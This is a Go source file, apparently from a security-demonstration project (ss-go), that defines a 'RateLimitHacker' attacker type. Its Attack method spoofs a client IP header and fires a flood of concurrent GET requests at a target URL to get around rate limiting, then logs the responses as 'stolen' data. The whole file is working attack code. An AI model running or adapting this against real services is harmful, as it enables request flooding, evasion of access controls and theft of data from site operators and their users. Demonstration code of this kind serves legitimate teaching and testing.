package broken_access_control

import (
	"fmt"
	ssgo "github.com/ra9dev/ss-go"
	"io"
	"net/http"
	"sync"
)

var _ ssgo.Hacker = (*RateLimitHacker)(nil)

// RateLimitHacker exploits a lack of rate limit protection and steals data from a given url
type RateLimitHacker struct {
	url        string
	remoteAddr string
}

// NewRateLimitHacker constructor
func NewRateLimitHacker(url, remoteAddr string) RateLimitHacker {
	return RateLimitHacker{
		url:        url,
		remoteAddr: remoteAddr,
	}
}

func (q RateLimitHacker) attack() error {
	req, err := http.NewRequest(http.MethodGet, q.url, nil)
	if err != nil {
		return fmt.Errorf("failed to prepare req: %w", err)
	}

	req.Header.Set(ipHeaderKey, q.remoteAddr)

	resp, err := http.DefaultClient.Do(req)
	if err != nil {
		return fmt.Errorf("failed to fetch data from %s: %w", req.URL.String(), err)
	}

	defer func() { _ = resp.Body.Close() }()

	data, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read data from %s: %w", req.URL.String(), err)
	}

	ssgo.HackerLogger.Printf("Data has been stolen from %s: %s", req.URL.String(), data)

	return nil
}

// Attack implementation of ssgo.Hacker
func (q RateLimitHacker) Attack() error {
	wg := new(sync.WaitGroup)

	for i := 0; i < stocksPathRPSLimit*stocksPathRPSLimit; i++ {
		wg.Add(1)

		go func() {
			defer wg.Done()

			if err := q.attack(); err != nil {
				ssgo.HackerLogger.Printf("failed to attack: %+v", err)

				return
			}
		}()
	}

	wg.Wait()

	return nil
}
